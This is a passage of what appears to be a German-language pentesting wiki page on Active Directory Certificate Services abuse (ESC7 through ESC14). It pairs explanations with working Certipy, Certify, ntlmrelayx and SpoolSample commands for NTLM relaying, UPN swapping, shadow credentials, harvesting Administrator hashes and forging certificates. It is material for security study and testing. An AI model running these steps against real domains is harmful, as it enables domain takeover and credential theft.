[*] Successfully issued certificate
```

Und schließlich können wir das **ausgestellte Zertifikat mit dem Befehl `req` und dem Parameter `-retrieve <request ID>` abrufen**.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Angriff 3 – Missbrauch der Manage Certificates-Erweiterung (SetExtension)

#### Erklärung

Zusätzlich zu den klassischen ESC7-Missbrauchsmöglichkeiten (Aktivieren von EDITF-Attributen oder Genehmigen ausstehender Anfragen) offenbarte **Certify 2.0** ein völlig neues Verfahren, für das lediglich die Rolle *Manage Certificates* (auch **Certificate Manager / Officer**) auf der Enterprise CA erforderlich ist.<sup>[[3]](#references)</sup>

Die RPC-Methode `ICertAdmin::SetExtension` kann von jedem Principal ausgeführt werden, der über *Manage Certificates* verfügt. Während die Methode traditionell von legitimen CAs verwendet wurde, um Erweiterungen ausstehender Anfragen zu aktualisieren, kann ein Angreifer sie missbrauchen, um einer auf Genehmigung wartenden Anfrage eine **nicht standardmäßige Zertifikatserweiterung** hinzuzufügen (zum Beispiel eine benutzerdefinierte *Certificate Issuance Policy*-OID wie `1.1.1.1`).

Da die Zielvorlage **keinen Standardwert für diese Erweiterung definiert**, wird die CA den vom Angreifer kontrollierten Wert NICHT überschreiben, wenn die Anfrage schließlich ausgestellt wird. Das resultierende Zertifikat enthält daher eine vom Angreifer gewählte Erweiterung, die möglicherweise:

* Anforderungen an Application / Issuance Policy anderer verwundbarer Vorlagen erfüllt (und so eine Rechteausweitung ermöglicht).
* Zusätzliche EKUs oder Richtlinien einschleust, die dem Zertifikat unerwartetes Vertrauen in Drittanbietersystemen verleihen.

Kurz gesagt: *Manage Certificates* – bisher als die „weniger mächtige“ Hälfte von ESC7 betrachtet – kann nun für eine vollständige Rechteausweitung oder langfristige Persistenz genutzt werden, ohne die CA-Konfiguration anzutasten oder das restriktivere Recht *Manage CA* zu benötigen.

#### Missbrauch des Verfahrens mit Certify 2.0

1. **Eine Zertifikatanfrage einreichen, die *ausstehend* bleibt.** Dies lässt sich mit einer Vorlage erzwingen, die eine Managergenehmigung erfordert:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Eine benutzerdefinierte Erweiterung an die ausstehende Anforderung anhängen** mit dem neuen `manage-ca`-Befehl:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Wenn die Vorlage die Erweiterung *Certificate Issuance Policies* nicht bereits definiert, bleibt der obige Wert nach der Ausstellung erhalten.*

3. **Stellen Sie die Anfrage aus** (wenn Ihre Rolle auch über Genehmigungsrechte für *Manage Certificates* verfügt), oder warten Sie, bis ein Operator sie genehmigt. Laden Sie nach der Ausstellung das Zertifikat herunter:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Das resultierende Zertifikat enthält nun die bösartige Issuance-Policy-OID und kann für nachfolgende Angriffe verwendet werden (z. B. ESC13, Domain-Eskalation usw.).

> HINWEIS: Derselbe Angriff kann mit Certipy ≥ 4.7 über den Befehl `ca` und den Parameter `-set-extension` ausgeführt werden.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Erklärung

> [!TIP]
> In Umgebungen, in denen **AD CS installiert ist**, wird **jeder Computer mit aktivem Spooler-Dienst für einen Angreifer kompromittierbar**, wenn ein **verwundbarer Web Enrollment-Endpunkt vorhanden** ist und mindestens **eine Zertifikatvorlage veröffentlicht ist**, die die **Enrollment-Berechtigung für Domänencomputer und Client Authentication** erlaubt (z. B. die standardmäßige Vorlage **`Machine`**)!

AD CS unterstützt mehrere **HTTP-basierte Enrollment-Methoden**, die über zusätzliche Serverrollen verfügbar gemacht werden, die Administratoren installieren können. Diese Schnittstellen für HTTP-basiertes Certificate Enrollment sind anfällig für **NTLM Relay-Angriffe**. Ein Angreifer kann sich von einem **kompromittierten Computer aus als jedes AD-Konto ausgeben, das sich über eingehendes NTLM authentifiziert**. Während der Angreifer das Opfer-Konto imitiert, kann er über diese Webschnittstellen **ein Client Authentication-Zertifikat mithilfe der Zertifikatvorlagen `User` oder `Machine` anfordern**.

- Die **Web Enrollment-Schnittstelle** (eine ältere ASP-Anwendung unter `http://<caserver>/certsrv/`) verwendet standardmäßig ausschließlich HTTP und bietet daher keinen Schutz vor NTLM Relay-Angriffen. Außerdem lässt sie über ihren Authorization-HTTP-Header ausdrücklich nur NTLM-Authentifizierung zu, wodurch sicherere Authentifizierungsmethoden wie Kerberos nicht infrage kommen.
- Der **Certificate Enrollment Service** (CES), der **Certificate Enrollment Policy**-Webservice (CEP) und der **Network Device Enrollment Service** (NDES) unterstützen standardmäßig Negotiate-Authentifizierung über ihren Authorization-HTTP-Header. Die Negotiate-Authentifizierung **unterstützt sowohl** Kerberos als auch **NTLM**, sodass ein Angreifer bei Relay-Angriffen auf NTLM-Authentifizierung **herabstufen** kann. Obwohl diese Webservices standardmäßig HTTPS verwenden, **schützt HTTPS allein nicht vor NTLM Relay-Angriffen**. HTTPS-Dienste lassen sich nur dann vor NTLM Relay-Angriffen schützen, wenn HTTPS mit Channel Binding kombiniert wird. Leider aktiviert AD CS Extended Protection for Authentication in IIS nicht, was für Channel Binding erforderlich ist.<sup>[[6]](#references)</sup>

Ein häufiges **Problem** bei NTLM Relay-Angriffen ist die **kurze Dauer von NTLM-Sitzungen** und die Unfähigkeit des Angreifers, mit Diensten zu interagieren, die **NTLM signing erfordern**.

Diese Einschränkung lässt sich jedoch umgehen, indem ein NTLM Relay-Angriff genutzt wird, um ein Zertifikat für den Benutzer zu erhalten: Die Gültigkeitsdauer des Zertifikats bestimmt die Dauer der Sitzung, und das Zertifikat kann bei Diensten verwendet werden, die **NTLM signing voraussetzen**. Eine Anleitung zur Verwendung eines gestohlenen Zertifikats findest du unter:


{{#ref}}
account-persistence.md
{{#endref}}

Eine weitere Einschränkung von NTLM Relay-Angriffen ist, dass **ein Angreifer-kontrollierter Computer von einem Opfer-Konto authentifiziert werden muss**. Der Angreifer kann entweder warten oder versuchen, diese Authentifizierung **zu erzwingen**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

Mit `cas` von [**Certify**](https://github.com/GhostPack/Certify) werden **aktivierte HTTP-AD-CS-Endpunkte** aufgelistet:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von Enterprise Certificate Authorities (CAs) verwendet, um Endpunkte des Certificate Enrollment Service (CES) zu speichern. Diese Endpunkte können mit dem Tool **Certutil.exe** geparst und aufgelistet werden:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Certipy fordert standardmäßig ein Zertifikat auf Basis der Vorlage `Machine` oder `User` an. Welche Vorlage verwendet wird, hängt davon ab, ob der weitergeleitete Kontoname mit `$` endet. Eine alternative Vorlage kann mit dem Parameter `-template` angegeben werden.

Anschließend kann eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) eingesetzt werden, um eine Authentifizierung zu erzwingen. Bei Domänencontrollern muss `-template DomainController` angegeben werden.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

Der Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, bezeichnet als ESC9, lässt die SID-Erweiterung `szOID_NTDS_CA_SECURITY_EXT` in einem Zertifikat weg. Ältere ESC9-Beispiele beruhen auf dem Kompatibilitätsverhalten des KDC (`StrongCertificateBindingEnforcement=1`) oder einem separaten schwachen Schannel-Mapping-Pfad. Der Wert `1` ist eine **historische Kompatibilitätseinstellung**, keine aktuelle Standardeinstellung: Microsoft zufolge wird die KDC-Überschreibung seit dem Windows-Sicherheitsupdate vom 9. September 2025 nicht mehr unterstützt. Prüfe das tatsächliche Update und den Authentifizierungsendpunkt des Ziels, bevor du ein älteres Vorgehen anwendest.<sup>[[7]](#references)</sup> Siehe [Microsofts Hinweise zum Rollout](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Zu den Bedingungen, unter denen die Einstellung dieses Flags relevant wird, gehören:

- Auf einem älteren, kompatiblen KDC erlaubt die wirksame Zertifikatsbindung Richtlinie das Mapping; alternativ aktiviert der Schannel-Endpunkt separat das UPN-Mapping über das `CertificateMappingMethods`-Bit `0x4`.
- Das Zertifikat ist in der Einstellung `msPKI-Enrollment-Flag` mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` gekennzeichnet.
- Im Zertifikat ist eine beliebige EKU für die Clientauthentifizierung angegeben.
- Für ein beliebiges Konto sind `GenericWrite`-Berechtigungen verfügbar, um ein anderes Konto zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` verfügt über `GenericWrite`-Berechtigungen für `Jane@corp.local` und will `Administrator@corp.local` kompromittieren. Die Zertifikatvorlage `ESC9`, für die `Jane@corp.local` eine Enrollment-Berechtigung hat, ist in ihrer Einstellung `msPKI-Enrollment-Flag` mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` konfiguriert.

Zunächst wird dank Johns `GenericWrite`-Berechtigung Janes Hash mithilfe von Shadow Credentials erlangt:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Anschließend wird `Jane`'s `userPrincipalName` zu `Administrator` geändert, wobei der Domänenteil `@corp.local` absichtlich weggelassen wird:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Diese Änderung verstößt nicht gegen Einschränkungen, da `Administrator@corp.local` weiterhin als `userPrincipalName` von `Administrator` verschieden ist.

Anschließend wird die als anfällig markierte Zertifikatvorlage `ESC9` als `Jane` angefordert:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Es wird festgestellt, dass der `userPrincipalName` des Zertifikats `Administrator` widerspiegelt und keine „object SID“ enthält.

Der `userPrincipalName` von `Jane` wird anschließend auf den ursprünglichen Wert `Jane@corp.local` zurückgesetzt:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Der Versuch, sich mit dem ausgestellten Zertifikat zu authentifizieren, liefert nun den NT-Hash von `Administrator@corp.local`. Der Befehl muss aufgrund der fehlenden Domänenangabe im Zertifikat `-domain <domain>` enthalten:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Schwache Zertifikatzuordnungen - ESC10

### Erklärung

Unter ESC10 werden häufig zwei separate Richtlinien für die Zertifikatzuordnung diskutiert. Lies die Einstellung auf dem Endpunkt aus, der die betreffende Authentifizierung tatsächlich verarbeitet:

- Schannels `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` steuert die Zuordnung von TLS-Clientzertifikaten auf dem Anwendungsserver. Das UPN-Bit ist `0x4`; der Standardwert auf aktualisierten Systemen ist `0x18` (`0x8 | 0x10`).
- KDCs `StrongCertificateBindingEnforcement` unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` steuerte historisch die Kompatibilität der Kerberos-Zertifikatbindung. Der Wert `1` ist kein verlässlicher aktueller Standardwert, und Microsoft hat die Unterstützung für diese Außerkraftsetzung mit dem Windows-Sicherheitsupdate vom 9. September 2025 eingestellt. Sein Status beschreibt allein nicht Schannels UPN-Zuordnung.<sup>[[7]](#references)</sup>

**Fall 1**

Historisch wurde `StrongCertificateBindingEnforcement=0` von älteren KDCs berücksichtigt. Überprüfe den Update-Stand, da diese Außerkraftsetzung auf aktuell gepatchten Systemen nicht mehr unterstützt wird.

**Fall 2**

Wenn auf dem Schannel-Endpunkt für Clientzertifikate das UPN-Bit (`0x4`) von `CertificateMappingMethods` aktiviert ist. Dies ist eine separate Einstellung von der Strong-Binding-Durchsetzung des KDC und setzt weiterhin ein enrollbares Clientauthentifizierungszertifikat sowie wirksame Kontrolle über das zugeordnete Kontenattribut voraus.

### Missbrauchsfall 1

In einer älteren Bereitstellung, in der der KDC `StrongCertificateBindingEnforcement=0` noch berücksichtigt, kann die Kontrolle über den `userPrincipalName` eines Kontos Teil eines Weak-Mapping-Pfads zu einem anderen Konto sein. Die erforderliche Zertifikatsregistrierung, Zuordnung, Zielidentität und erfolgreiche Authentifizierung müssen separat überprüft werden; ein `GenericWrite`-ACE oder ein Registrierungswert allein belegt keine Übernahme.

Hat ein Angreifer beispielsweise `GenericWrite`-Berechtigungen für `Jane@corp.local`, zielt er darauf ab, `Administrator@corp.local` zu kompromittieren. Das Vorgehen entspricht ESC9 und ermöglicht die Verwendung einer beliebigen Zertifikatvorlage.

Zunächst wird Janes Hash mithilfe von Shadow Credentials abgerufen, wobei die `GenericWrite`-Berechtigung ausgenutzt wird.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Anschließend wird der `userPrincipalName` von `Jane` zu `Administrator` geändert. Dabei wird der Teil `@corp.local` absichtlich weggelassen, um eine Constraint-Verletzung zu vermeiden.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Anschließend wird als `Jane` ein Zertifikat angefordert, das Clientauthentifizierung ermöglicht. Dafür wird die standardmäßige `User`-Vorlage verwendet.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Der `userPrincipalName` von `Jane` wird anschließend auf seinen ursprünglichen Wert `Jane@corp.local` zurückgesetzt.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`. Da das Zertifikat keine Domänendetails enthält, muss die Domäne im Befehl angegeben werden.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Missbrauchsfall 2

Wenn `CertificateMappingMethods` das UPN-Bitflag (`0x4`) enthält, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, dem die Eigenschaft `userPrincipalName` fehlt. Dazu zählen Computerkonten und der integrierte Domänenadministrator `Administrator`.

Hier besteht das Ziel darin, `DC$@corp.local` zu kompromittieren. Dazu wird zunächst mithilfe von Shadow Credentials und unter Ausnutzung von `GenericWrite` der Hash von `Jane` erlangt.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Der `userPrincipalName` von `Jane` wird dann auf `DC$@corp.local` gesetzt.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Ein Zertifikat zur Client-Authentifizierung wird als `Jane` unter Verwendung der Standardvorlage `User` angefordert.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Der `userPrincipalName` von `Jane` wird nach diesem Vorgang auf seinen ursprünglichen Wert zurückgesetzt.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Zur Authentifizierung über Schannel wird Certipys Option `-ldap-shell` verwendet. Die erfolgreiche Authentifizierung wird durch `u:CORP\DC$` angezeigt.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Über die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Angriffe mit Resource-Based Constrained Delegation (RBCD), durch die möglicherweise der Domain Controller kompromittiert werden kann.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Diese Schwachstelle betrifft auch jedes Benutzerkonto ohne `userPrincipalName` oder mit einem `userPrincipalName`, der nicht mit dem `sAMAccountName` übereinstimmt. Das standardmäßige `Administrator@corp.local` ist aufgrund seiner erhöhten LDAP-Berechtigungen und des standardmäßig fehlenden `userPrincipalName` ein besonders attraktives Ziel.

## Relaying NTLM to ICPR - ESC11

### Erklärung

Wenn der CA Server nicht mit `IF_ENFORCEENCRYPTICERTREQUEST` konfiguriert ist, sind NTLM relay attacks ohne Signing über den RPC service möglich. [Referenz hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Mit `certipy` kannst du ermitteln, ob `Enforce Encryption for Requests` deaktiviert ist. certipy zeigt dann `ESC11`-Schwachstellen an.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Missbrauchsszenario

Dazu muss ein Relay-Server eingerichtet werden:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Hinweis: Bei Domain Controllern müssen wir `-template` in DomainController angeben.

Oder mithilfe von [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access zu ADCS CA mit YubiHSM - ESC12

### Erklärung

Administratoren können die Certificate Authority so einrichten, dass sie auf einem externen Gerät wie dem „Yubico YubiHSM2“ gespeichert wird.

Wenn ein USB-Gerät über einen USB-Anschluss mit dem CA-Server verbunden ist oder ein USB-Device-Server verwendet wird, falls der CA-Server eine virtuelle Maschine ist, benötigt der Key Storage Provider einen Authentication Key (manchmal auch als „Passwort“ bezeichnet), um Schlüssel im YubiHSM zu generieren und zu verwenden.

Dieser Schlüssel/dieses Passwort wird im Klartext in der Registry unter `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` gespeichert.

Referenz [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Missbrauchsszenario

Wenn der private Schlüssel der CA auf einem physischen USB-Gerät gespeichert ist und du Shell access erhalten hast, kann der Schlüssel wiederhergestellt werden.

Zuerst musst du das CA-Zertifikat beschaffen (es ist öffentlich) und dann:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Verwenden Sie abschließend den Befehl `certutil -sign`, um mit dem CA-Zertifikat und dessen privatem Schlüssel ein neues beliebiges Zertifikat zu fälschen.

## OID Group Link Abuse - ESC13

### Erklärung

Mit dem Attribut `msPKI-Certificate-Policy` kann die Ausstellungspolicy zur Zertifikatvorlage hinzugefügt werden. Die für Ausstellungspolicies zuständigen `msPKI-Enterprise-Oid`-Objekte können im Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) des PKI-OID-Containers gefunden werden. Über das Attribut `msDS-OIDToGroupLink` dieses Objekts kann eine Policy mit einer AD-Gruppe verknüpft werden. Dadurch kann ein System einen Benutzer, der das Zertifikat vorlegt, so autorisieren, als wäre er Mitglied der Gruppe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Mit anderen Worten: Wenn ein Benutzer zum Registrieren eines Zertifikats berechtigt ist und das Zertifikat mit einer OID-Gruppe verknüpft ist, kann der Benutzer die Berechtigungen dieser Gruppe erben.

Verwenden Sie [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), um OIDToGroupLink zu finden:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Missbrauchsszenario

Finde eine Benutzerberechtigung, die mit `certipy find` oder `Certify.exe find /showAllPermissions` genutzt werden kann.

Wenn `John` die Berechtigung hat, sich für `VulnerableTemplate` zu registrieren, kann der Benutzer die Berechtigungen der Gruppe `VulnerableGroup` erben.

Dazu muss er lediglich die Vorlage angeben. Er erhält dann ein Zertifikat mit OIDToGroupLink-Rechten.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Missbrauch expliziter Zertifikatszuordnungen — ESC14

### Erklärung

Die Beschreibung unter https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ist bemerkenswert ausführlich. Nachfolgend ein Zitat des Originaltexts.<sup>[[14]](#references)</sup>

ESC14 behandelt Schwachstellen, die durch „schwache explizite Zertifikatszuordnungen“ entstehen, vor allem durch den Missbrauch oder die unsichere Konfiguration des Attributs `altSecurityIdentities` bei Active-Directory-Benutzer- oder Computerkonten. Dieses mehrwertige Attribut ermöglicht es Administratoren, X.509-Zertifikate für Authentifizierungszwecke manuell einem AD-Konto zuzuordnen. Wenn dieses Attribut befüllt ist, können diese expliziten Zuordnungen die standardmäßige Zertifikatszuordnungslogik überschreiben, die sich typischerweise auf UPNs oder DNS-Namen im SAN des Zertifikats oder auf die in der Sicherheitserweiterung `szOID_NTDS_CA_SECURITY_EXT` eingebettete SID stützt.

Eine Zuordnung ist „schwach“, wenn der im Attribut `altSecurityIdentities` verwendete Zeichenfolgenwert zur Identifizierung eines Zertifikats zu allgemein oder leicht zu erraten ist, auf nicht eindeutigen Zertifikatsfeldern basiert oder leicht fälschbare Zertifikatskomponenten verwendet. Kann ein Angreifer ein Zertifikat beschaffen oder erstellen, dessen Attribute einer solchen schwach definierten expliziten Zuordnung für ein privilegiertes Konto entsprechen, kann er sich mit diesem Zertifikat als das Konto authentifizieren und es imitieren.

Beispiele für potenziell schwache Zuordnungszeichenfolgen in `altSecurityIdentities`:

- Zuordnung ausschließlich anhand eines allgemeinen Subject Common Name (CN): z. B. `X509:<S>CN=SomeUser`. Ein Angreifer könnte ein Zertifikat mit diesem CN aus einer weniger sicheren Quelle beschaffen.
- Verwendung zu allgemeiner Issuer Distinguished Names (DNs) oder Subject DNs ohne zusätzliche Einschränkung, etwa durch eine bestimmte Seriennummer oder Subject Key Identifier: z. B. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Verwendung anderer vorhersehbarer Muster oder nicht kryptografischer Kennungen, die ein Angreifer in einem Zertifikat erfüllen könnte, das er rechtmäßig beschaffen oder fälschen kann (wenn er eine CA kompromittiert oder eine verwundbare Vorlage wie bei ESC1 gefunden hat).

Das Attribut `altSecurityIdentities` unterstützt verschiedene Zuordnungsformate, darunter:

- `X509:<I>IssuerDN<S>SubjectDN` (Zuordnung anhand des vollständigen Issuer- und Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (Zuordnung anhand des Werts der Subject Key Identifier-Erweiterung des Zertifikats)
- `X509:<SR>SerialNumberBackedByIssuerDN` (Zuordnung anhand der Seriennummer, implizit durch den Issuer-DN eingeschränkt) – dies ist kein Standardformat; üblicherweise lautet es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (Zuordnung anhand eines RFC822-Namens, typischerweise einer E-Mail-Adresse, aus dem SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (Zuordnung anhand eines SHA1-Hashes des öffentlichen Rohschlüssels des Zertifikats – im Allgemeinen stark)

Die Sicherheit dieser Zuordnungen hängt von den verwendeten Kennungen ab. Microsoft stuft Zuordnungen anhand von E-Mail-Adressen oder Subject-Namen, einschließlich `X509:<RFC822>`, als **schwach** ein. Im Modus „Full Enforcement“ wird ein Zertifikat ohne starke Zuordnung abgelehnt; das Windows-Sicherheitsupdate vom September 2025 hat die Möglichkeit entfernt, zum Kompatibilitätsmodus zurückzukehren. Eine schwache Zuordnung allein ist daher kein zuverlässiger aktueller Weg zur Identitätsübernahme. Prüfe vor der Bewertung eines Szenarios mit schwacher Zuordnung den tatsächlichen Patchstand des Domänencontrollers und das Verhalten bei der Zertifikatszuordnung. Schreibzugriff auf `altSecurityIdentities` ist ein separater Ansatzpunkt: Ein Angreifer mit einem geeigneten vertrauenswürdigen Zertifikat kann möglicherweise eine **starke** explizite Zuordnung hinzufügen, abhängig von den effektiven Berechtigungen und der Zertifikatsvalidierung. Siehe [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) und [die ESC14-Recherche](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Auch Fehler bei der Zertifikatsauthentifizierung müssen untersucht werden: Ein deaktiviertes Zielkonto oder ein abgelaufenes Kennwort kann die Anmeldung verhindern, selbst wenn das Zertifikat weiterhin gültig ist.

### Missbrauchsszenario

ESC14 zielt auf **explizite Zertifikatszuordnungen** in Active Directory (AD), insbesondere auf das Attribut `altSecurityIdentities`. Wenn dieses Attribut gesetzt ist (absichtlich oder aufgrund einer Fehlkonfiguration), können Angreifer Konten imitieren, indem sie Zertifikate vorlegen, die der Zuordnung entsprechen.

#### Szenario A: Angreifer kann `altSecurityIdentities` bearbeiten

 **Voraussetzung**: Der Angreifer hat Schreibberechtigungen für das Attribut `altSecurityIdentities` des Zielkontos oder die Berechtigung, diese zu erteilen, in Form einer der folgenden Berechtigungen für das Ziel-AD-Objekt:  
- Eigenschaft `altSecurityIdentities` schreiben  
- Eigenschaft `Public-Information` schreiben  
- Eigenschaft schreiben (alle)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Szenario B: Das Ziel verfügt über eine schwache Zuordnung via X509RFC822 (E-Mail)

- **Historische/bedingte Voraussetzung**: Das Ziel verfügt in `altSecurityIdentities` über eine schwache X509RFC822-Zuordnung, der Angreifer kann das Attribut `mail` eines Antragstellers bearbeiten, und eine geeignete Vorlage nimmt diese E-Mail-Adresse in ein Client-Authentifizierungszertifikat auf, ohne eine widersprüchliche SID-Bindung. Die Authentifizierung setzt außerdem eine Umgebung voraus, die die schwache Zuordnung noch akzeptiert; „Full Enforcement“ lehnt Zertifikatszuordnungen ab, die ausschließlich schwach sind. Ein beschreibbares Attribut `mail` allein ist nur ein Ansatzpunkt.
